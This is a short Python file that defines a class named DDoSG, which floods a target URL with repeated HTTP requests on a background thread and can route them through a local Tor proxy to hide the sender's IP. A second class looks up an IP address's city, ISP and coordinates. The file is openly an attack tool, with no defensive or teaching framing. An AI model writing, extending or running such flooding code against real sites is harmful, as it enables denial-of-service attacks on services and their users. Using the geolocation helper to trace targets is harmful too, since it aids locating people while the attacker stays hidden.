import threading
import requests
import socket
import time

class DDoSG:
    def __init__(self, url, requests_count, seconds, proxy=False):
        self.url = url
        self.requests_count = requests_count
        self.seconds = seconds
        self.proxy = proxy
        self.running = True
        if not self.url.startswith(('http://', 'https://')):
            self.url = 'http://' + self.url

    def get_response(self):
        try:
            proxies = None
            if self.proxy:
                test_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_connection.settimeout(1)
                result = test_connection.connect_ex(('127.0.0.1', 9050))
                test_connection.close()
                if result == 0:
                    proxies = {
                        'http': 'socks5h://127.0.0.1:9050',
                        'https': 'socks5h://127.0.0.1:9050'
                    }
                    print("Using Tor proxy to hide IP")
                else:
                    print("WARNING: Tor proxy not available. Running without proxy.")

            requests_per_second = self.requests_count / self.seconds
            for i in range(self.requests_count):
                if not self.running:
                    break
                response = requests.get(self.url, proxies=proxies, timeout=10)
                print(f"SEND SERVER RESPONSE: {response.status_code} for {self.url}")
                time.sleep(1 / requests_per_second)
        except Exception as e:
            print(f"Error: {e}")
    def send(self):
        attack_thread = threading.Thread(target=self.get_response)
        attack_thread.start()
        return attack_thread
    def stop_running(self):
        self.running = False
        print("Attack stopped")

class GetLocationG:
    def __init__(self, ip):
        self.ip = ip
        self.location = None

    def get_location(self):
        try:
            response = requests.get(f'https://ipinfo.io/{self.ip}/json', timeout=10)
            data = response.json()
            self.location = {
                "IP": data.get("ip"),
                "Region": data.get("region"),
                "City": data.get("city"),
                "Country": data.get("country"),
                "ISP": data.get("org"),
                "Latitude": data.get("loc").split(',')[0],
                "Longitude": data.get("loc").split(',')[1]
            }
            return self.location
        except Exception as e:
            print(f"ERROR: {e}, please check the IP address")
    
        